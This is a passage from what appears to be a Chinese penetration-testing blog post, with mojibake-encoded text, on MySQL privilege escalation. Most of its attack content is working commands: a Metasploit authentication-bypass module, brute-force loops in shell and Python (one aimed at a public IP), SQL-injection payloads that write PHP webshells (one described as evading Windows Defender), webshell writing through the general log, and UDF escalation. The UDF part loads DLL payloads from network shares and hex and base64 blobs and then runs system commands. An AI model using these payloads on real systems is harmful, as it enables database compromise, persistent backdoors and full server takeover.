æ˜¯ç›¸åŒçš„ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦çŸ¥é“ç”¨æˆ·åï¼Œä¸æ–­å°è¯•å°±èƒ½å¤Ÿç›´æ¥ç™»å…¥SQLæ•°æ®åº“ã€‚</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>å—å½±å“ç‰ˆæœ¬ï¼š</p><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>msfé‡Œé¢å·²ç»é›†æˆäº†åˆ©ç”¨æ¨¡å—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line"><span class="built_in">set</span> rhosts 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> rport 3306</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200330181301.png" style="zoom:80%;"><p>ç„¶åè§£hashå°±è¡Œï¼Œè§£å‡ºæ¥ç™»é™†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -P 9906 -h 127.0.0.1 -p</span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200330181748.png" style="zoom:80%;"><p>å½“ç„¶çˆ†ç ´ç™»é™†çš„æ–¹å¼ä¸æ­¢è¿™ä¸€ç§</p><p><strong>shellè„šæœ¬ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -u root -h 127.0.0.1 -P 9906 --password=bad 2&gt;/dev/null; done</span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200330182518.png" style="zoom:80%;"><p><strong>pythonè„šæœ¬ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        subprocess.Popen(<span class="string">&quot;mysql -u root -h 47.97.210.171 -P 9906 --password=aaa&quot;</span>, shell=<span class="literal">True</span>).wait()</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨å†™shell"><a href="#åˆ©ç”¨å†™shell" class="headerlink" title="åˆ©ç”¨å†™shell"></a>åˆ©ç”¨å†™shell</h2><h3 id="outfileå†™æ–‡ä»¶"><a href="#outfileå†™æ–‡ä»¶" class="headerlink" title="outfileå†™æ–‡ä»¶"></a>outfileå†™æ–‡ä»¶</h3><p>è¯¥æ“ä½œéœ€è¦å†™æ–‡ä»¶çš„ç›®å½•è¦æœ‰å†™æƒé™ï¼Œå¹¶ä¸”mysqlä¹Ÿè¦æœ‰å†™æ–‡ä»¶æƒé™ï¼Œéœ€è¦è¿›è¡Œä»¥ä¸‹æ›´æ”¹å‚æ•°</p><p> secure_file_priv å‚æ•°æ˜¯åªè¯»å‚æ•°ï¼Œä¸èƒ½ä½¿ç”¨ SET GLOBAL è¯­å¥ä¿®æ”¹ï¼Œåªæœ‰ä¿®æ”¹ MySQL çš„é…ç½®æ–‡ä»¶å¹¶é‡å¯ MySQL æ‰èƒ½å¯¹æ­¤è¿›è¡Œä¿®æ”¹ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET GLOBAL secure_file_priv=&#x27;&#x27;;</span><br><span class="line">ERROR 1238 (HY000): Variable &#x27;secure_file_priv&#x27; is a read only variable</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹mysql.ini æ–‡ä»¶ï¼Œåœ¨[mysqld] ä¸‹æ·»åŠ æ¡ç›®: <code>secure_file_priv =</code></p><p>ä¿å­˜ï¼Œé‡å¯mysqlã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å€¼ä¸ºnull ï¼Œä¹Ÿå°±æ˜¯æ³¨é‡Šæ‰è¿™ä¸ªå‚æ•°æˆ–è€…secure_file_priv&#x3D;nullã€‚è¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º</span><br><span class="line">å€¼ä¸º&#x2F;tmp&#x2F; ï¼Œå³secure_file_priv&#x3D;&quot;&#x2F;tmp&#x2F;&quot; è¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹</span><br><span class="line">æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œå³secure_file_priv&#x3D;      è¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</span><br></pre></td></tr></table></figure><p>ä»¥sqli-labsç¬¬ä¸€å…³ä¸ºä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="string">&#x27; union select 1,@@basedir,@@datadir%23</span></span><br></pre></td></tr></table></figure><p><code>@@basedir</code>æ˜¯æŒ‡Mysqlçš„å®‰è£…ç›®å½•ï¼Œ<code>@@datadir</code>æ˜¯æŒ‡æ•°æ®åº“æ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨webç›®å½•ï¼Œå¯ä»¥æ ¹æ®ä»¥ä¸Šçš„ä¿¡æ¯çŒœä¸€ä¸‹</p><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200331200426.png" style="zoom:80%;"><p>ç„¶åå°±å¯ä»¥å†™é©¬äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &quot;C:/phpStudy/PHPTutorial/www/moonback.php&quot;%23</span></span><br></pre></td></tr></table></figure><p>è¿™ç§Windows Defenderç›´æ¥æ€äº†ï¼Œä¸‹é¢è¿™ä¸ªå¯ä»¥è¿‡Windows Defender</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="meta">&lt;?php</span> array_udiff_assoc(<span class="keyword">array</span>($_REQUEST[<span class="number">1</span>]), <span class="keyword">array</span>(<span class="number">1</span>), <span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &quot;C:/phpStudy/PHPTutorial/www/moonback.php&quot;%23</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥ç”¨sqlmapå†™webshellæ–‡ä»¶</p><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200331223516.png" style="zoom: 80%;"><h3 id="åˆ©ç”¨æ—¥å¿—å†™shell"><a href="#åˆ©ç”¨æ—¥å¿—å†™shell" class="headerlink" title="åˆ©ç”¨æ—¥å¿—å†™shell"></a>åˆ©ç”¨æ—¥å¿—å†™shell</h3><p>å‰ææ˜¯çŸ¥é“mysql rootç”¨æˆ·å¯†ï¼Œè¿™é‡Œä»¥phpmyadminä¸ºä¾‹</p><p>å¼€å¯æ—¥å¿—è®°å½•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æ—¥å¿—æ–‡ä»¶å¯¼å‡ºæŒ‡å®šç›®å½•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">&#x27;C:/phpstudy/PHPTutorial/WWW/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>è®°å½•sqlè¯­å¥å†™é©¬</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å…³é—­è®°å½•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">off</span>;</span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200331212354.png" style="zoom:80%;"><h2 id="udfææƒ"><a href="#udfææƒ" class="headerlink" title="udfææƒ"></a>udfææƒ</h2><h3 id="udfææƒç®€ä»‹"><a href="#udfææƒç®€ä»‹" class="headerlink" title="udfææƒç®€ä»‹"></a>udfææƒç®€ä»‹</h3><p>UDF(user-defined function)æ˜¯MySQLçš„ä¸€ä¸ªæ‹“å±•æ¥å£ï¼Œä¹Ÿå¯ç§°ä¹‹ä¸º<strong>ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</strong>ï¼Œå®ƒæ˜¯ç”¨æ¥æ‹“å±•MySQLçš„æŠ€æœ¯æ‰‹æ®µï¼Œå¯ä»¥è¯´æ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ï¼Œç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°æ¥å®ç°åœ¨MySQLä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨SQLè¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒæœ¬æœºå‡½æ•°å¦‚ABS()æˆ–SOUNDEX()ä¸€æ ·æ–¹ä¾¿ã€‚</p><p><strong>åŠ¨æ€é“¾æ¥åº“ï¼š</strong>æ˜¯æŠŠç¨‹åºä»£ç ä¸­ä¼šä½¿ç”¨çš„å‡½æ•°ç¼–è¯‘æˆæœºå™¨ç ï¼Œä¸è¿‡æ˜¯ä¿å­˜åœ¨.dllæ–‡ä»¶ä¸­ã€‚å¦å¤–åœ¨ç¼–è¯‘æ—¶ï¼Œä¸ä¼šæŠŠå‡½æ•°çš„æœºå™¨ç å¤åˆ¶ä¸€ä»½åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ç¼–è¯‘å™¨åªä¼šåœ¨.exeçš„æ‰§è¡Œæ–‡ä»¶é‡Œï¼Œè¯´æ˜æ‰€è¦è°ƒç”¨çš„å‡½æ•°æ”¾åœ¨å“ªä¸€ä¸ª*.dllæ–‡ä»¶ã€‚ç¨‹åºæ‰§è¡Œä½¿ç”¨åˆ°è¿™äº›å‡½æ•°æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠdllæ–‡ä»¶ä¸­çš„å‡½æ•°æ‹¿å‡ºæ¥ç»™æ‰§è¡Œæ–‡ä»¶ä½¿ç”¨</p><p>udfææƒçš„å‰ææ˜¯å·²çŸ¥mysqlä¸­rootçš„è´¦å·å¯†ç ï¼Œæˆ‘ä»¬åœ¨æ‹¿åˆ°webshellåï¼Œå¯ä»¥çœ‹ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„config.phpé‡Œï¼Œä¸€èˆ¬éƒ½æœ‰mysqlçš„è´¦å·å¯†ç ã€‚åˆ©ç”¨rootæƒé™ï¼Œåˆ›å»ºå¸¦æœ‰è°ƒç”¨cmdå‡½æ•°çš„â€™udf.dllâ€™(åŠ¨æ€é“¾æ¥åº“)ã€‚å½“æˆ‘ä»¬æŠŠâ€™udf.dllâ€™å¯¼å‡ºæŒ‡å®šæ–‡ä»¶å¤¹å¼•å…¥Mysqlæ—¶ï¼Œå…¶ä¸­çš„è°ƒç”¨å‡½æ•°æ‹¿å‡ºæ¥å½“ä½œmysqlçš„å‡½æ•°ä½¿ç”¨ã€‚è¿™æ ·æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°æ‰è¢«å½“ä½œæœ¬æœºå‡½æ•°æ‰§è¡Œã€‚åœ¨ä½¿ç”¨CREAT FUNCITONè°ƒç”¨dllä¸­çš„å‡½æ•°åï¼Œmysqlè´¦å·è½¬åŒ–ä¸ºsystemæƒé™ï¼Œä»è€Œæ¥ææƒã€‚</p><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>å½“ç„¶udfææƒçš„å‰ææ˜¯å¼€å¯secure_file_privå‚æ•°</p><p>é¦–å…ˆæˆ‘ä»¬è¦åˆ¤æ–­mysqlç‰ˆæœ¬ï¼Œæ ¹æ®ä¸åŒçš„ç‰ˆæœ¬ï¼š</p><ul><li>mysqlç‰ˆæœ¬ &lt; 5.2 , UDFå¯¼å‡ºåˆ°ç³»ç»Ÿç›®å½•<code>c:/windows/system32/</code></li><li>mysqlç‰ˆæœ¬ &gt; 5.2 ï¼ŒUDFå¯¼å‡ºåˆ°å®‰è£…è·¯å¾„<code>MySQL/lib/plugin/</code>ï¼Œé»˜è®¤æ˜¯æ²¡pluginè·¯å¾„çš„</li></ul><p>æŸ¥è¯¢æ’ä»¶å®‰è£…ç›®å½•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%plugin%&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200331214935.png" style="zoom:80%;"><h4 id="å¤§é©¬ææƒ"><a href="#å¤§é©¬ææƒ" class="headerlink" title="å¤§é©¬ææƒ"></a>å¤§é©¬ææƒ</h4><p>è¿™é‡Œç”¨çš„æ˜¯ï¼š<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php</a></p><p>ä¸Šä¼ udf.php,ç™»å½•è¿›å»ï¼Œå®ƒä¼šè‡ªåŠ¨åˆ¤æ–­<code>mysql</code>ç‰ˆæœ¬å†³å®šå‡ºå¯¼å‡º<code>dll</code>æ–‡ä»¶ä½ç½®</p><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200331215307.png" style="zoom:80%;"><p>å…ˆç‚¹Create PluginDiråˆ›å»ºpluginç›®å½•ï¼Œç„¶åDump UDF â€“&gt; Create Function â€“&gt; Mysql_queryä¾æ¬¡å¯¼å‡ºdllåˆ°æŒ‡å®šç›®å½•ï¼Œå°†udfçš„è‡ªå®šä¹‰å‡½æ•°å¼•å…¥ï¼Œæ‰§è¡Œå‘½ä»¤</p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿åˆ°è¿™å°é¶æœºçš„ç®¡ç†å‘˜æƒé™</p><p><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM%E6%88%AA%E5%9B%BE20200331222304.png"></p><p>æƒ³è¦åˆ é™¤å‡½æ•°å¯ä»¥ç”¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> shell; åˆ é™¤å‡½æ•°</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">&#x27;shell&#x27;</span>  åˆ é™¤å‡½æ•°</span><br></pre></td></tr></table></figure><h4 id="æ‰‹å·¥ææƒ"><a href="#æ‰‹å·¥ææƒ" class="headerlink" title="æ‰‹å·¥ææƒ"></a>æ‰‹å·¥ææƒ</h4><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿæ¶æ„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@version_compile_os, @@version_compile_machine;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠå¯¹åº”ç³»ç»Ÿudf.dllæˆ–è€…udf.soä¸Šä¼ ä¸Šå»</p><p>ç½‘å€ï¼š<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p><p>ä¸Šä¼ çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç½‘ç»œè·¯å¾„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&#x27;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#x27;</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§æ–¹æ³•æ˜¯å°†æ•´ä¸ªDLLæ–‡ä»¶ä»¥åå…­è¿›åˆ¶ç¼–ç åå†™å…¥ç£ç›˜ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#x27;</span>)) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&#x27;/tmp/udf.hex&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000</span>â€¦ <span class="keyword">into</span> dump <span class="keyword">file</span> <span class="string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªè¡¨å¹¶å°†äºŒè¿›åˆ¶æ•°æ®æ’å…¥åˆ°åå…­è¿›åˆ¶ç¼–ç æµä¸­ã€‚ä½ å¯ä»¥é€šè¿‡insertè¯­å¥æˆ–å°†å…¶åˆ†è§£ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼Œç„¶åé€šè¿‡updateè¯­å¥æ‹¼æ¥äºŒè¿›åˆ¶æ•°æ®ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> temp(<span class="keyword">data</span> longblob);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> temp(<span class="keyword">data</span>) <span class="keyword">values</span> (<span class="number">0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> temp <span class="keyword">set</span> <span class="keyword">data</span> = <span class="keyword">concat</span>(<span class="keyword">data</span>,<span class="number">0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> temp <span class="keyword">into</span> dump <span class="keyword">file</span> <span class="string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½ ä¹Ÿå¯ä»¥ç›´æ¥ä»ç£ç›˜å°†æ–‡ä»¶ä»ç½‘ç»œå…±äº«åŠ è½½åˆ°ä¸Šé¢åˆ›å»ºçš„è¡¨ä¸­ï¼Œæˆ–ä½¿ç”¨â€œå¿«é€Ÿå¯¼å…¥æ•°æ®ï¼ˆload data infileï¼‰â€è¯­å¥åœ¨æœ¬åœ°åŠ è½½ã€‚å°†æ–‡ä»¶åƒä¸Šé¢æ˜¾ç¤ºçš„é‚£æ ·è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶åœ¨å†™å…¥ç£ç›˜æ—¶è§£ç ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">&#x27;\\\\192.168.0.19\\network\\udf.hex&#x27;</span> </span><br><span class="line"><span class="keyword">into</span> <span class="keyword">table</span> temp <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">&#x27;@OsandaMalith&#x27;</span> </span><br><span class="line"><span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">&#x27;@OsandaMalith&#x27;</span> (<span class="keyword">data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(<span class="keyword">data</span>) <span class="keyword">from</span> temp <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&#x27;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå¥½æ¶ˆæ¯ï¼Œå°±æ˜¯ä»MySQL 5.6.1å’ŒMariaDB 10.0.5å¼€å§‹ï¼Œæ–°å¢äº†to_base64å’Œfrom_base64å‡½æ•°ã€‚å¦‚æœä½ æ˜¯ä¸€ä¸ªå–„äºç»•è¿‡SQLæ³¨å…¥WAFçš„äººï¼Œç›¸ä¿¡ä½ å·²ç»åœ¨ä½¿ç”¨è¿™äº›å‡½æ•°äº†ï¼ˆæç¤ºï¼šè·¯ç”±æŸ¥è¯¢æ³¨å…¥ï¼‰ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">to_base64</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#x27;</span>)) </span><br><span class="line"><span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&#x27;/tmp/udf.b64&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥ç¼–è¾‘base64æ–‡ä»¶å¹¶é€šè¿‡ä»¥ä¸‹æ–¹å¼å°†å…¶dumpåˆ°æ’ä»¶ç›®å½•ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">from_base64</span>(<span class="string">&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v</span></span><br><span class="line"><span class="string">ZGUuDQ0KJAAAAAAAAAAzwu3gd6ODs3ejg7N3o4OzafEQs3Wjg7Np8QCzfaODs2nxB7N1o4OzUGX4</span></span><br><span class="line"><span class="string">s3Sjg7N3o4KzW6ODs2nxCrN2o4OzafEWs3Wjg7Np8RGzdqODs2nxErN2o4OzUmljaHejg7MAAAAA</span></span><br><span class="line"><span class="string">AAAAAAAAAAAAAAAAUEUAAGSGBgBwsYNLAAAAAAAAAADwACIgCwIJAAASAAAAFgAAAAAAADQaAAAA</span></span><br><span class="line"><span class="string">EAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAAAAAQAADPOAAACAEABAAAQAAAA</span></span><br><span class="line"><span class="string">AAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAA5AAAFAgAAQDQAADwAAAAAYAAAsAIA</span></span><br><span class="line"><span class="string">AABQAABoAQAAAAAAAAAAAAAAcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAAAAAAAAAAAAAAAAAAAAAwAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAAR</span></span><br><span class="line"><span class="string">EAAAABAAAAASAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAABQsAAAAwAAAADAAAABYAAAAA&quot;</span>) </span><br><span class="line"><span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä¹‹åï¼Œä½ å¯ä»¥åƒè¿™æ ·å°†æ•´ä¸ªæ–‡ä»¶ä¼ é€’ç»™mysqlã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.0.30 -uosanda -pabc123 &lt; /tmp/udf.b64</span><br></pre></td></tr></table></figure><p>ä½ ä¹Ÿå¯ä»¥ä»ç½‘ç»œå…±äº«å†™å…¥base64ç¼–ç æ–‡ä»¶æˆ–ä½¿ç”¨â€œå¿«é€Ÿå¯¼å…¥æ•°æ®ï¼ˆload data infileï¼‰â€è¯­å¥åœ¨æœ¬åœ°åŠ è½½å¹¶é€šè¿‡ä»¥ä¸‹è¯­å¥dumpã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">from_base64</span>(<span class="keyword">data</span>) <span class="keyword">from</span> temp </span><br><span class="line"><span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&#x27;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æ¥ç€å°†udfçš„è‡ªå®šä¹‰å‡½æ•°å¼•å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">&#x27;udf.dll&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="åå¼¹ç«¯å£ææƒ"><a href="#åå¼¹ç«¯å£ææƒ" class="headerlink" title="åå¼¹ç«¯å£ææƒ"></a>åå¼¹ç«¯å£ææƒ</h4><p>åŸç†å°±æ˜¯åŸºäºudfææƒ</p><p><strong>expï¼š</strong><a 